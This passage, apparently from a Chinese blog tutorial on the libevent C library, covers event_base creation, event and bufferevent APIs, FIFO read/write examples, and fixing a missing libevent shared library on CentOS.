class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_eventcb(struct bufferevent *bev, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Connection closed.\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; BEV_EVENT_ERROR) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Got an error on the connection: %s\n"</span>,</span><br><span class="line">    strerror(errno));<span class="comment">/*XXX win32*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* None of the other events can happen here, since we haven't enabled</span></span><br><span class="line"><span class="comment"> * timeouts */</span></span><br><span class="line">bufferevent_free(bev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">signal_cb(<span class="keyword">evutil_socket_t</span> sig, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">delay</span> = &#123;</span> <span class="number">2</span>, <span class="number">0</span> &#125;; <span class="comment">//延迟两秒</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Caught an interrupt signal; exiting cleanly in two seconds.\n"</span>);</span><br><span class="line"></span><br><span class="line">event_base_loopexit(base, &amp;delay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="libevent框架"><a href="#libevent框架" class="headerlink" title="libevent框架"></a>libevent框架</h4><h5 id="创建event-base"><a href="#创建event-base" class="headerlink" title="创建event_base"></a>创建event_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="function">struct event_base *<span class="title">event_base_new</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br></pre></td></tr></table></figure><h5 id="创建事件"><a href="#创建事件" class="headerlink" title="创建事件"></a>创建事件</h5><ul><li>常规事件 <code>event</code>—-&gt;<code>event_new()</code></li><li>带缓冲区的事件 <code>bufferevent</code> —-&gt;<code>bufferevent_socket_new()</code></li></ul><h5 id="添加事件"><a href="#添加事件" class="headerlink" title="添加事件"></a>添加事件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="启动循环"><a href="#启动循环" class="headerlink" title="启动循环"></a>启动循环</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_dispatch</span><span class="params">(struct event_base *base)</span></span>;</span><br><span class="line">base:event_base_new 函数的返回值</span><br><span class="line">  成功：<span class="number">0</span>，失败：<span class="number">-1</span></span><br></pre></td></tr></table></figure><p>只有<code>event_new</code>中指定了<code>EV_PERSIST</code>才持续触发，否则只触发一次，就跳出循环</p><p>通常设置为<code>EV_WRITE|EV_PERSIST</code>、<code>EV_READ|EV_PERSIST</code></p><h5 id="其他循环"><a href="#其他循环" class="headerlink" title="其他循环"></a>其他循环</h5><p>在指定时间后停止循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopexit</span><span class="params">(struct event_base *base,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><p>立即停止循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopbreak</span><span class="params">(struct event_base *base)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="释放event-base"><a href="#释放event-base" class="headerlink" title="释放event_base"></a>释放event_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event_base_free(base);</span><br></pre></td></tr></table></figure><h4 id="查看支持哪些多路I-O"><a href="#查看支持哪些多路I-O" class="headerlink" title="查看支持哪些多路I/O"></a>查看支持哪些多路I/O</h4><p><code>event.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">event_base_new</span>();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> **buf;</span><br><span class="line">buf = event_get_supported_methods();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buf[%d]=%s\n"</span>,i,buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc event.c -o event -l event</span><br></pre></td></tr></table></figure><p>执行结果如下，可以发现mac并不支持<code>epoll</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro event % ./event </span><br><span class="line">buf[<span class="number">0</span>]=poll</span><br><span class="line">buf[<span class="number">1</span>]=select</span><br><span class="line">buf[<span class="number">2</span>]=(null)</span><br><span class="line">buf[<span class="number">3</span>]=(null)</span><br><span class="line">buf[<span class="number">4</span>]=(null)</span><br><span class="line">buf[<span class="number">5</span>]=(null)</span><br><span class="line">buf[<span class="number">6</span>]=(null)</span><br><span class="line">buf[<span class="number">7</span>]=(null)</span><br><span class="line">buf[<span class="number">8</span>]=(null)</span><br><span class="line">buf[<span class="number">9</span>]=(null)</span><br></pre></td></tr></table></figure><h4 id="创建事件-1"><a href="#创建事件-1" class="headerlink" title="创建事件"></a>创建事件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct event *<span class="title">event_new</span><span class="params">(struct event_base *base,<span class="keyword">evutil_socket_t</span> fd,short what,event_callback_fn cb,<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"></span><br><span class="line">base: event_base_new()返回值</span><br><span class="line">  fd: 绑定到event上的文件描述符</span><br><span class="line">  what: 对应的事件(读、写、异常)</span><br><span class="line">    EV_READ 一次读事件</span><br><span class="line">    EV_WRITE 一次写事件</span><br><span class="line">    EV_PERSIST 持续触发，结合event_base_dispatch函数使用</span><br><span class="line">  cb: 一旦事件满足监听条件，回调的函数</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*event_callback_fn)</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short,<span class="keyword">void</span> *)</span></span></span><br><span class="line">  arg: 回调的函数的参数</span><br><span class="line">  返回值: 成功创建的event</span><br></pre></td></tr></table></figure><h4 id="添加事件到base"><a href="#添加事件到base" class="headerlink" title="添加事件到base"></a>添加事件到base</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br><span class="line"></span><br><span class="line">ev: event_new()函数返回的事件</span><br><span class="line">  tv: <span class="literal">NULL</span>,即不会超时 一旦等到事件被触发，回调函数会被调用</span><br></pre></td></tr></table></figure><h4 id="从base拿下事件"><a href="#从base拿下事件" class="headerlink" title="从base拿下事件"></a>从base拿下事件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_del</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()的返回值</span><br></pre></td></tr></table></figure><h4 id="销毁事件"><a href="#销毁事件" class="headerlink" title="销毁事件"></a>销毁事件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_free</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()的返回值</span><br><span class="line">  成功: <span class="number">0</span></span><br><span class="line">  失败: <span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="使用libevent读写fifo"><a href="#使用libevent读写fifo" class="headerlink" title="使用libevent读写fifo"></a>使用libevent读写fifo</h4><p><code>read_fifo.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//读管道</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read event: %s \n"</span>,what &amp; EV_READ ?<span class="string">"Yes"</span>:<span class="string">"No"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"data len = %d,buf = %s\n"</span>,len,buf);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">unlink(<span class="string">"myfifo"</span>);</span><br><span class="line">mkfifo(<span class="string">"myfifo"</span>,<span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_RDONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_READ|EV_PERSIST,read_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件循环</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write_fifo.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//写管道</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"hello,world-%d\n"</span>,num++);</span><br><span class="line">write(fd,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_WRONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_WRITE|EV_PERSIST,write_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件循环</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在mac上编译执行之后发现并没有打印结果，<code>gdb</code>调试一下，发现卡在了<code>dispatch</code>这里，<code>dispatch</code>函数就相当于是<code>while+select/poll/epoll</code>这种形式，对于<code>libevent</code>库默认使用的是<code>epoll</code>，然而<code>epoll</code>对于mac是不支持的。</p><p><img src="/2021/11/19/浅学libevent/4.png" alt="4"></p><p>于是我把代码放到了<code>centos</code>服务器上，<code>./read_fifo</code>运行报错如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error <span class="keyword">while</span> loading shared libraries: libevent<span class="number">-2.1</span>.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure><p>ldd查看依赖发现没有找到<code>libevent-2.1.so.6</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>创建软链接如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/lib/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> /usr/lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span></span><br></pre></td></tr></table></figure><p>再次查看依赖</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; /lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> (<span class="number">0x00007fda57a25000</span>)</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>之后分别执行<code>./read_fifo</code>和<code>./write_fifo</code>。发现成功读写</p><p><img src="/2021/11/19/浅学libevent/5.png" alt="5"></p><h4 id="事件的未决和非未决"><a href="#事件的未决和非未决" class="headerlink" title="事件的未决和非未决"></a>事件的未决和非未决</h4><ul><li>未决：有资格被处理，但尚未被处理</li><li>非未决：没有资格被处理</li></ul><p>事件的未决和非未决状态转换图如下所示</p><p><img src="/2021/11/19/浅学libevent/6.png" alt="6"></p><h4 id="bufferevent"><a href="#bufferevent" class="headerlink" title="bufferevent"></a>bufferevent</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>bufferevent</code>有两个缓冲区，也是队列实现，先进先出</p><p>读：有数据——&gt;读回调函数被调用——-&gt;使用<code>bufferevent_read()</code>——&gt;读数据</p><p>写：使用<code>bufferevent_write()</code>——-&gt;向写缓冲中写数据——-&gt;该缓冲区有数据自动写出——&gt;写完，回调函数被调用</p><h4 id="bufferevent创建和释放"><a href="#bufferevent创建和释放" class="headerlink" title="bufferevent创建和释放"></a>bufferevent创建和释放</h4><p>创建<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">ev</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">bufferevent</span> *<span class="title">bufferevent_socket_new</span>(<span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,<span class="title">evutil_socket_tfd</span>,<span class="title">enum</span> <span class="title">bufferevent_options</span> <span class="title">options</span>);</span></span><br><span class="line"></span><br><span class="line">base: event_base_new函数的返回值</span><br><span class="line">fd: 跟bufferevent绑定的文件描述符类比event_new()</span><br><span class="line">options: BEV_OPT_CLOSE_ON_FREE只用这一个即可</span><br><span class="line">   </span><br><span class="line">返回: 成功创建的bufferevent事件对象</span><br></pre></td></tr></table></figure><p>释放<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_free</span><span class="params">(struct bufferevent *bev)</span></span></span><br></pre></td></tr></table></figure><h4 id="给读写缓冲区设置回调"><a href="#给读写缓冲区设置回调" class="headerlink" title="给读写缓冲区设置回调"></a>给读写缓冲区设置回调</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span 